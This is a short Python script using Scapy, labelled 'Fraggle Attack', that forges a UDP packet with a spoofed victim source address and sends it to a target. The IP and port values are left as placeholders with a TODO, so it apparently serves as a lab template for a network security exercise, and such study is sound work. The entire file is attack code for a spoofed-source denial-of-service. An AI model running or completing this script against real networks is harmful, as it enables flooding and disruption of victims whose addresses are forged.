#!/bin/env python3
import socket
from scapy.all import *

# TODO: IP & port configuration
# Tip: suffix
IP_victim = @@@
IP_dst = @@@
port_src = @@@
port_dst = @@@

ip = IP(src=IP_victim,dst=IP_dst)
udp = UDP(sport=port_src,dport=port_dst)
data = "Fire in the hole!!!\n"
pkt = ip/udp/data

print("Fraggle Attack")

send(pkt,verbose=0)
